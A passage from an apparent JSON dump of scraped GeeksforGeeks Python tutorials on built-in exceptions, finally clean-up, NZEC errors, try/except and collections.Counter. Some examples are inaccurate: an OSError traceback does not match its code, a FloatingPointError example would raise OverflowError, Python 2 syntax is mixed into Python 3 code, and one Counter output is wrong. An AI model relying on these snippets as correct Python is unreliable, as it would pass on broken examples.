LookupError:\u00a0\u00a0\u00a0\u00a0\u00a0print (\"Index out of bound error.\")else:\u00a0\u00a0\u00a0\u00a0\u00a0print (\"Success\")\u00a0\u00a0Output :\r\nIndex out of bound error.\r\nConcrete exceptionsThe following exceptions are the exceptions that are usually raised.exception AssertionErrorAn AssertionError is raised when an assert statement fails.Example :\r\nassert False, 'The assertion failed'\r\nOutput :\r\nTraceback (most recent call last):\r\n  File \"exceptions_AssertionError.py\", line 12, in \r\n    assert False, 'The assertion failed'\r\nAssertionError: The assertion failed\r\nexception AttributeErrorAn AttributeError is raised when an attribute reference or assignment fails such as when a non-existent attribute is referenced.Example :class Attributes(object):\u00a0\u00a0\u00a0\u00a0pass\u00a0\u00a0object = Attributes()print (object.attribute)Output :\r\nTraceback (most recent call last):\r\n  File \"d912bae549a2b42953bc62da114ae7a7.py\", line 5, in \r\n    print object.attribute\r\nAttributeError: 'Attributes' object has no attribute 'attribute'\r\nexception EOFErrorAn EOFError is raised when built-in functions like input() hits an end-of-file condition (EOF) without reading any data. The file methods like readline() return an empty string when they hit EOF.Example :while True:\u00a0\u00a0\u00a0\u00a0data = input('Enter name : ')\u00a0\u00a0\u00a0\u00a0print ('Hello\u00a0 ', data)Output :\r\nEnter Name :Hello Aditi\r\nEnter Name :Traceback (most recent call last):\r\n  File \"exceptions_EOFError.py\", line 13, in \r\n    data = raw_input('Enter name :')\r\nEOFError: EOF when reading a line\r\nexception FloatingPointErrorA FloatingPointError is raised when a floating point operation fails. This exception is always defined, but can only be raised when Python is configured with the\u2013with-fpectl option, or the WANT_SIGFPE_HANDLER symbol is defined in the pyconfig.h file.Example :import math\u00a0\u00a0print (math.exp(1000))Output :\r\nTraceback (most recent call last):\r\n  File \"\", line 1, in \r\nFloatingPointError: in math_1\r\nexception GeneratorExitThis exception directly inherits from BaseException instead of Exception since it is technically not an error. A GeneratorExit exception is raised when a generator or coroutine is closed.Example :def my_generator():\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(5):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print ('Yielding', i)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0yield i\u00a0\u00a0\u00a0\u00a0except GeneratorExit:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print ('Exiting early')\u00a0\u00a0g = my_generator()print (g.next())g.close()\u00a0\u00a0Output :\r\nYielding 0\r\n0\r\nExiting early\r\nexception ImportErrorAn ImportError is raised when the import statement is unable to load a module or when the \u201cfrom list\u201d in from \u2026 import has a name that cannot be found.Example :import module_does_not_existOutput :\r\nTraceback (most recent call last):\r\n  File \"exceptions_ImportError_nomodule.py\", line 12, in \r\n    import module_does_not_exist\r\nImportError: No module named module_does_not_exist\r\n\r\nExample :from exceptions import UserexceptionOutput :\r\nTraceback (most recent call last):\r\n  File \"exceptions_ImportError_missingname.py\", line 12, in \r\n    from exceptions import Userexception\r\nImportError: cannot import name Userexception\r\n\r\nexception ModuleNotFoundErrorThis is the subclass of ImportError which is raised by import when a module could not be found. It is also raised when None is found in sys.modules.exception IndexErrorAn IndexError is raised when a sequence is referenced which is out of range.Example :array = [ 0, 1, 2 ]print (array[3])Output :\r\nTraceback (most recent call last):\r\n  File \"exceptions_IndexError.py\", line 13, in \r\n    print array[3]\r\nIndexError: list index out of range\r\nexception KeyErrorA KeyError is raised when a mapping key is not found in the set of existing keys.Example :array = { 'a':1, 'b':2 }print (array['c'])Output :\r\nTraceback (most recent call last):\r\n  File \"exceptions_KeyError.py\", line 13, in \r\n    print array['c']\r\nKeyError: 'c'\r\nexception KeyboardInterruptThis error is raised when the user hits the interrupt key such as Control-C or Delete.Example :try:\u00a0\u00a0\u00a0\u00a0print ('Press Return or Ctrl-C:',)\u00a0\u00a0\u00a0\u00a0ignored = input()except Exception, err:\u00a0\u00a0\u00a0\u00a0print ('Caught exception:', err)except KeyboardInterrupt, err:\u00a0\u00a0\u00a0\u00a0print ('Caught KeyboardInterrupt')else:\u00a0\u00a0\u00a0\u00a0print ('No exception')Output :\r\nPress Return or Ctrl-C: ^CCaught KeyboardInterrupt\r\nexception MemoryErrorThis error is raised when an operation runs out of memory.Example :def fact(a):\u00a0\u00a0\u00a0\u00a0factors = []\u00a0\u00a0\u00a0\u00a0for i in range(1, a+1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if a%i == 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0factors.append(i)\u00a0\u00a0\u00a0\u00a0return factors\u00a0\u00a0\u00a0num = 600851475143print (fact(num))Output :\r\nTraceback (most recent call last):\r\n  File \"4af5c316c749aff128df20714536b8f3.py\", line 9, in \r\n    print fact(num)\r\n  File \"4af5c316c749aff128df20714536b8f3.py\", line 3, in fact\r\n    for i in range(1, a+1):\r\nMemoryError\r\nexception NameErrorThis error is raised when a local or global name is not found. For example, an unqualified variable name.Example :def func():\u00a0\u00a0\u00a0\u00a0print ans\u00a0\u00a0func()Output :\r\nTraceback (most recent call last):\r\n  File \"cfba0a5196b05397e0a23b1b5b8c7e19.py\", line 4, in \r\n    func()\r\n  File \"cfba0a5196b05397e0a23b1b5b8c7e19.py\", line 2, in func\r\n    print ans\r\nNameError: global name 'ans' is not defined\r\nexception NotImplementedErrorThis exception is derived from RuntimeError. Abstract methods in user defined classed should raise this exception when the derived classes override the method.Example :class BaseClass(object):\u00a0\u00a0\u00a0\u00a0\"\"\"Defines the interface\"\"\"\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0super(BaseClass, self).__init__()\u00a0\u00a0\u00a0\u00a0def do_something(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"\"\"The interface, not implemented\"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0raise NotImplementedError(self.__class__.__name__ + '.do_something')\u00a0\u00a0class SubClass(BaseClass):\u00a0\u00a0\u00a0\u00a0\"\"\"Implementes the interface\"\"\"\u00a0\u00a0\u00a0\u00a0def do_something(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"\"\"really does something\"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (self.__class__.__name__ + ' doing something!')\u00a0\u00a0SubClass().do_something()BaseClass().do_something()Output :\r\nTraceback (most recent call last):\r\n  File \"b32fc445850cbc23cd2f081ba1c1d60b.py\", line 16, in \r\n    BaseClass().do_something()\r\n  File \"b32fc445850cbc23cd2f081ba1c1d60b.py\", line 7, in do_something\r\n    raise NotImplementedError(self.__class__.__name__ + '.do_something')\r\nNotImplementedError: BaseClass.do_something\r\nexception OSError([arg])The OSError exception is raised when a system function returns a system-related error, including I/O failures such as \u201cfile not found\u201d or \u201cdisk full\u201d errors.Example :def func():\u00a0\u00a0\u00a0\u00a0print (ans)\u00a0\u00a0func()Output :\r\nTraceback (most recent call last):\r\n  File \"442eccd7535a2704adbe372cb731fc0f.py\", line 4, in \r\n    print i, os.ttyname(i)\r\nOSError: [Errno 25] Inappropriate ioctl for device\r\nexception OverflowErrorThe OverflowError is raised when the result of an arithmetic operation is out of range. Integers raise MemoryError instead of OverflowError. OverflowError is sometimes raised for integers that are outside a required range. Floating point operations are not checked because of the lack of standardization of floating point exception handling in C.Example :import sys\u00a0\u00a0print ('Regular integer: (maxint=%s)' % sys.maxint)try:\u00a0\u00a0\u00a0\u00a0i = sys.maxint * 3\u00a0\u00a0\u00a0\u00a0print ('No overflow for ', type(i), 'i =', i)except OverflowError, err:\u00a0\u00a0\u00a0\u00a0print ('Overflowed at ', i, err)\u00a0\u00a0print()print ('Long integer:')for i in range(0, 100, 10):\u00a0\u00a0\u00a0\u00a0print ('%2d' % i, 2L ** i)\u00a0\u00a0print()print ('Floating point values:')try:\u00a0\u00a0\u00a0\u00a0f = 2.0**i\u00a0\u00a0\u00a0\u00a0for i in range(100):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (i, f)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f = f ** 2except OverflowError, err:\u00a0\u00a0\u00a0\u00a0print ('Overflowed after ', f, err)Output :\r\nRegular integer: (maxint=9223372036854775807)\r\nNo overflow for   i = 27670116110564327421\r\n\r\nLong integer:\r\n 0 1\r\n10 1024\r\n20 1048576\r\n30 1073741824\r\n40 1099511627776\r\n50 1125899906842624\r\n60 1152921504606846976\r\n70 1180591620717411303424\r\n80 1208925819614629174706176\r\n90 1237940039285380274899124224\r\n\r\nFloating point values:\r\n0 1.23794003929e+27\r\n1 1.53249554087e+54\r\n2 2.34854258277e+108\r\n3 5.5156522631e+216\r\nOverflowed after  5.5156522631e+216 (34, 'Numerical result out of range')\r\n\r\nexception RecursionErrorThe RecursionError is derived from the RuntimeError. This exception is raised when the interpreter detects that the maximum recursion depth is exceeded.exception ReferenceErrorThe ReferenceError is raised when a weak reference proxy is used to access an attribute of the referent after the garbage collection.Example :import gcimport weakref\u00a0\u00a0class Foo(object):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __init__(self, name):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __del__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print ('(Deleting %s)' % self)\u00a0\u00a0obj = Foo('obj')p = weakref.proxy(obj)\u00a0\u00a0print ('BEFORE:', p.name)obj = Noneprint ('AFTER:', p.name)Output :\r\nBEFORE: obj\r\n(Deleting )\r\nAFTER:\r\n\r\nTraceback (most recent call last):\r\n  File \"49d0c29d8fe607b862c02f4e1cb6c756.py\", line 17, in \r\n    print 'AFTER:', p.name\r\nReferenceError: weakly-referenced object no longer exists\r\nexception RuntimeErrorThe RuntimeError is raised when no other exception applies. It returns a string indicating what precisely went wrong.exception StopIterationThe StopIteration error is raised by built-in function next() and an iterator\u2018s __next__() method to signal that all items are produced by the iterator.Example :Arr = [3, 1, 2]i=iter(Arr)\u00a0\u00a0print (i)print (i.next())print (i.next())print (i.next())print (i.next())Output :\r\n\r\n3\r\n1\r\n2\r\n\r\nTraceback (most recent call last):\r\n  File \"2136fa9a620e14f8436bb60d5395cc5b.py\", line 8, in \r\n    print i.next()\r\nStopIteration\r\nexception SyntaxErrorThe SyntaxError is raised when the parser encounters a syntax error. A syntax error may occur in an import statement or while calling the built-in functions exec() or eval(), or when reading the initial script or standard input.Example :try:\u00a0\u00a0\u00a0\u00a0print (eval('geeks for geeks'))except SyntaxError, err:\u00a0\u00a0\u00a0\u00a0print ('Syntax error %s (%s-%s): %s' % \\\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0(err.filename, err.lineno, err.offset, err.text))\u00a0\u00a0\u00a0\u00a0print (err)Output :\r\nSyntax error  (1-9): geeks for geeks\r\ninvalid syntax (, line 1)\r\nexception SystemErrorThe SystemError is raised when the interpreter finds an internal error. The associated value is a string indicating what went wrong.exception SystemExitThe SystemExit is raised when sys.exit() function is called. A call to sys.exit() is translated into an exception to execute clean-up handlers (finally clauses of try statements) and to debug a script without running the risk of losing control.exception TypeErrorTypeError is raised when an operation or function is applied to an object of inappropriate type. This exception returns a string giving details about the type mismatch.Example :arr = ('tuple', ) + 'string'print (arr)Output :\r\nTraceback (most recent call last):\r\n  File \"30238c120c0868eba7e13a06c0b1b1e4.py\", line 1, in \r\n    arr = ('tuple', ) + 'string'\r\nTypeError: can only concatenate tuple (not \"str\") to tuple\r\nexception UnboundLocalErrorUnboundLocalError is a subclass of NameError which is raised when a reference is made to a local variable in a function or method, but no value has been assigned to that variable.Example :def global_name_error():\u00a0\u00a0\u00a0\u00a0print (unknown_global_name)\u00a0\u00a0def unbound_local():\u00a0\u00a0\u00a0\u00a0local_val = local_val + 1\u00a0\u00a0\u00a0\u00a0print (local_val)\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0global_name_error()except NameError, err:\u00a0\u00a0\u00a0\u00a0print ('Global name error:', err)\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0unbound_local()except UnboundLocalError, err:\u00a0\u00a0\u00a0\u00a0print ('Local name error:', err)Output :\r\nGlobal name error: global name 'unknown_global_name' is not defined\r\nLocal name error: local variable 'local_val' referenced before assignment\r\nexception UnicodeErrorThis exception is a subclass of ValueError. UnicodeError is raised when a Unicode-related encoding or decoding error occurs.exception ValueErrorA ValueError is raised when a built-in operation or function receives an argument that has the right type but an invalid value.Example :print (int('a'))Output :\r\nTraceback (most recent call last):\r\n  File \"44f00efda935715a3c5468d899080381.py\", line 1, in \r\n    print int('a')\r\nValueError: invalid literal for int() with base 10: 'a'\r\nexception ZeroDivisionErrorA ZeroDivisionError is raised when the second argument of a division or modulo operation is zero. This exception returns a string indicating the type of the operands and the operation.Example :print (1/0)Output :\r\nTraceback (most recent call last):\r\n  File \"c31d9626b41e53d170a78eac7d98cb85.py\", line 1, in \r\n    print 1/0\r\nZeroDivisionError: integer division or modulo by zero\r\nThis article is contributed by Aditi Gupta. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "49aa2e21269541f0f77c8bcbcef47ff6",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Think of a task you will always want your program to do, whether it runs perfectly or raise any kind of error. For example, We use of try statement which has an optional clause \u2013 \u201cfinally\u201d to perform clean up actions, that must be executed under all conditions.Cleanup actions: Before leaving the try statement, \u201cfinally\u201d clause is always executed, whether an exception is raised or not. These are clauses which are intended to define clean-up actions that must be executed under all circumstances.Whenever an exception occurs and is not being handled by the except clause, first finally will occur and then the error is raised as default [Code 3].Python Programs illustrating \u201cDefining Clean Up Actions\u201dCode 1 : Code works normally and clean-up action is taken at the end# Python code to illustrate# clean up actionsdef divide(x, y):\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Floor Division : Gives only Fractional Part as Answer\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0result = x // y\u00a0\u00a0\u00a0\u00a0except ZeroDivisionError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Sorry ! You are dividing by zero \")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Yeah ! Your answer is:\", result)\u00a0\u00a0\u00a0\u00a0finally:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"I'm finally clause, always raised !! \")\u00a0\u00a0# Look at parameters and note the working of Programdivide(3, 2)Output :\r\nYeah ! Your answer is : 1\r\nI'm finally clause, always raised !! \r\n\u00a0Code 2 : Code raise error and is carefully handled in the except clause. Note that Clean-up action is taken at the end.# Python code to illustrate# clean up actionsdef divide(x, y):\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Floor Division : Gives only Fractional Part as Answer\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0result = x // y\u00a0\u00a0\u00a0\u00a0except ZeroDivisionError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Sorry ! You are dividing by zero \")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Yeah ! Your answer is:\", result)\u00a0\u00a0\u00a0\u00a0finally:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"I'm finally clause, always raised !! \")\u00a0\u00a0# Look at parameters and note the working of Programdivide(3, 0)Output :\r\nSorry ! You are dividing by zero \r\nI'm finally clause, always raised !!\r\n\u00a0Code 3 : Code, raise error but we don\u2019t have any except clause to handle it. So, clean-up action is taken first and then the error(by default) is raised by the compiler.# Python code to illustrate# clean up actionsdef divide(x, y):\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Floor Division : Gives only Fractional Part as Answer\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0result = x // y\u00a0\u00a0\u00a0\u00a0except ZeroDivisionError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Sorry ! You are dividing by zero \")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Yeah ! Your answer is:\", result)\u00a0\u00a0\u00a0\u00a0finally:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"I'm finally clause, always raised !! \")\u00a0\u00a0# Look at parameters and note the working of Programdivide(3, \"3\")Output :\r\nI'm finally clause, always raised !! Error:\r\nTraceback (most recent call last):\r\n  File \"C:/Users/DELL/Desktop/Code.py\", line 15, in \r\n    divide(3, \"3\")\r\n  File \"C:/Users/DELL/Desktop/Code.py\", line 7, in divide\r\n    result = x // y\r\nTypeError: unsupported operand type(s) for //: 'int' and 'str'\r\nThis article is contributed by Mohit Gupta_OMG \ud83d\ude00. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "4a65b1752f9bcc0a84a008f5494e9104",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "While coding in various competitive sites, many people must have encountered NZEC errors. NZEC (non zero exit code) as the name suggests occurs when your code is failed to return 0. When a code returns 0 it means it is successfully executed otherwise it will return some other number depending on the type of error.When the program ends and it is supposed to return \u201c0\u201d to indicate if finished fine and is not able to do so it causes NZEC. Of course, there are more cases associated with NZEC.Why does NZEC occur?(one example)In python, generally, multiple inputs are separated by commas and we read them using input() or\u00a0int(input()), but most of the online coding platforms while testing gives input separated by space and in those cases, int(input()) is not able to read the input properly and shows error like NZEC.How to resolve?For Example, Think of a simple program where you have to read 2 integers and print them(in input file both integers are in same line). Suppose you have two integers as shown below:23 45Instead of using :n = int(input())\r\nk = int(input())Use:n, k = raw_input().split(\" \")\r\nn = int(n)\r\nk = int(k)to delimit input by white spaces.Wrong coden = int(input())k = int(input())print n,\" \",kInput:2 3When you run the above code in IDE with above input you will get error:-\r\nTraceback (most recent call last):\r\n  File \"b712edd81d4a972de2a9189fac8a83ed.py\", line 1, in \r\n    n = int(input())\r\n  File \"\", line 1\r\n    2 3\r\n      ^\r\nSyntaxError: unexpected EOF while parsing\r\nThe above code will work fine when the input is in 2 two different lines. You can test yourself. To overcome this problem you need to use split.Correct coden, k = raw_input().split(\" \")n = int(n)k = int(k)print n,\" \",kInput:\r\n7 3Output:\r\n7   3\r\nSome prominent reasons for NZEC errorInfinite Recursion or if you have run out of stack memory.Input and output both are NOT exactly same as the test cases.As the online platforms, test your program using a computer code which matches your output with the specified outputs exactly.This type of error is also shown when your program is performing basic programming mistakes like dividing by 0.Check for the values of your variables, they can be vulnerable to integer flow.There could be some other reasons also for the occurrence NZEC error, I have listed the frequent ones.This article is contributed by Aakash Tiwari. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "65be4d3ff82f0bf8510f643358e921fd",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Error in Python can be of two types i.e. Syntax errors and Exceptions. Errors are the problems in a program due to which the program will stop the execution. On the other hand, exceptions are raised when some internal events occur which changes the normal flow of the program.Note: For more information, refer to Errors and Exceptions in PythonSome of the common Exception Errors are :\u00a0\u00a0IOError: if the file can\u2019t be openedKeyboardInterrupt: when an unrequired key is pressed by the userValueError: when built-in function receives a wrong argumentEOFError: if End-Of-File is hit without reading any dataImportError: if it is unable to find the module\u00a0Try Except in PythonTry and Except statement is used to handle these errors within our code in Python. The try block is used to check some code for errors i.e the code inside the try block will execute when there is no error in the program. Whereas the code inside the except block will execute whenever the program encounters some error in the preceding try block.\u00a0Syntax:\u00a0try:\n    # Some Code\nexcept:\n    # Executed if error in the\n    # try blockHow try() works?\u00a0\u00a0First, the try clause is executed i.e. the code between try and except clause.If there is no exception, then only the try clause will run, except the clause is finished.If any exception occurs, the try clause will be skipped and except clause will run.If any exception occurs, but the except clause within the code doesn\u2019t handle it, it is passed on to the outer try statements. If the exception is left unhandled, then the execution stops.A try statement can have more than one except clauseCode 1: No exception, so the try clause will run.\u00a0\u00a0Python3# Python code to illustrate# working of try()def divide(x, y):\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Floor Division : Gives only Fractional Part as Answer\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0result = x // y\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Yeah ! Your answer is :\", result)\u00a0\u00a0\u00a0\u00a0except ZeroDivisionError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Sorry ! You are dividing by zero \")\u00a0# Look at parameters and note the working of Programdivide(3, 2)Output :\u00a0\u00a0('Yeah ! Your answer is :', 1)Code 1: There is an exception so only except clause will run.\u00a0\u00a0Python3# Python code to illustrate# working of try()def divide(x, y):\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Floor Division : Gives only Fractional Part as Answer\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0result = x // y\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Yeah ! Your answer is :\", result)\u00a0\u00a0\u00a0\u00a0except ZeroDivisionError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Sorry ! You are dividing by zero \")\u00a0# Look at parameters and note the working of Programdivide(3, 0)Output :\u00a0\u00a0Sorry ! You are dividing by zero\u00a0Else ClauseIn python, you can also use the else clause on the try-except block which must be present after all the except clauses. The code enters the else block only if the try clause does not raise an exception.\u00a0Syntax:try:\n    # Some Code\nexcept:\n    # Executed if error in the\n    # try block\nelse:\n    # execute if no exceptionCode:Python3# Program to depict else clause with try-except\u00a0\u00a0# Function which returns a/bdef AbyB(a , b):\u00a0\u00a0\u00a0\u00a0try:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0c = ((a+b) // (a-b))\u00a0\u00a0\u00a0\u00a0except ZeroDivisionError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"a/b result in 0\")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (c)\u00a0\u00a0# Driver program to test above functionAbyB(2.0, 3.0)AbyB(3.0, 3.0)Output:-5.0\na/b result in 0\u00a0Finally Keyword in PythonPython provides a keyword finally, which is always executed after the try and except blocks. The final block always executes after normal termination of try block or after try block terminates due to some exceptions.\u00a0Syntax:try:\n    # Some Code\nexcept:\n    # Executed if error in the\n    # try block\nelse:\n    # execute if no exception\nfinally:\n    # Some code .....(always executed)Code:Python3# Python program to demonstrate finally\u00a0\u00a0\u00a0\u00a0# No exception Exception raised in try blocktry:\u00a0\u00a0\u00a0\u00a0k = 5//0 # raises divide by zero exception.\u00a0\u00a0\u00a0\u00a0print(k)\u00a0\u00a0\u00a0\u00a0# handles zerodivision exception\u00a0\u00a0\u00a0\u00a0except ZeroDivisionError:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"Can't divide by zero\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0finally:\u00a0\u00a0\u00a0\u00a0# this block is always executed\u00a0\u00a0\u00a0\u00a0\u00a0# regardless of exception generation.\u00a0\u00a0\u00a0\u00a0print('This is always executed')\u00a0Output:Can't divide by zero\nThis is always executedRelated Articles:\u00a0\u00a0Output QuestionsException Handling in PythonUser-Defined ExceptionsThis article is contributed by Mohit Gupta_OMG \ud83d\ude00. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "f02630ea363f486c65e6d7269905d2a1",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Counter is a container included in the collections module. Now you all must be wondering what is a container. Don\u2019t worry first let\u2019s discuss about the container.What is Container?Containers are objects that hold objects. They provide a way to access the contained objects and iterate over them. Examples of built in containers are Tuple, list, and dictionary. Others are included in Collections module.A Counter is a subclass of dict. Therefore it is an unordered collection where elements and their respective count are stored as a dictionary. This is equivalent to a bag or multiset of other languages.Syntax :class collections.Counter([iterable-or-mapping])Initialization :The constructor of counter can be called in any one of the following ways :With sequence of itemsWith dictionary containing keys and countsWith keyword arguments mapping string names to countsExample of each type of initialization :# A Python program to show different ways to create# Counterfrom collections import Counter\u00a0\u00a0# With sequence of items\u00a0print(Counter(['B','B','A','B','C','A','B','B','A','C']))\u00a0\u00a0# with dictionaryprint(Counter({'A':3, 'B':5, 'C':2}))\u00a0\u00a0# with keyword argumentsprint(Counter(A=3, B=5, C=2))Output of all the three lines is same :\r\nCounter({'B': 5, 'A': 3, 'C': 2})\r\nCounter({'B': 5, 'A': 3, 'C': 2})\r\nCounter({'B': 5, 'A': 3, 'C': 2})\r\nUpdation :We can also create an empty counter in the following manner :\r\ncoun = collections.Counter()\r\nAnd can be updated via update() method .Syntax for the same :\r\ncoun.update(Data)\r\n# A Python program to demonstrate update()from collections import Countercoun = Counter()\u00a0\u00a0coun.update([1, 2, 3, 1, 2, 1, 1, 2])print(coun)\u00a0\u00a0coun.update([1, 2, 4])print(coun)Output :\r\nCounter({1: 4, 2: 3, 3: 1})\r\nCounter({1: 5, 2: 4, 3: 1, 4: 1})\r\nData can be provided in any of the three ways as mentioned in initialization and the counter\u2019s data will be increased not replaced.Counts can be zero and negative also.# Python program to demonstrate that counts in\u00a0# Counter can be 0 and negativefrom collections import Counter\u00a0\u00a0c1 = Counter(A=4,\u00a0 B=3, C=10)c2 = Counter(A=10, B=3, C=4)\u00a0\u00a0c1.subtract(c2)print(c1)Output : Counter({'c': 6, 'B': 0, 'A': -6})We can use Counter to count distinct elements of a list or other collections.# An example program where different list items are# counted using counterfrom collections import Counter\u00a0\u00a0# Create a listz = ['blue', 'red', 'blue', 'yellow', 'blue', 'red']\u00a0\u00a0# Count distinct elements and print Counter abojectprint(Counter(z))Output:\r\nCounter({'blue': 3, 'red': 2, 'yellow': 1})\r\nThis article is contributed by Mayank Rawat .If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "a82374843133ce9c7dbdcef40e31865c",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
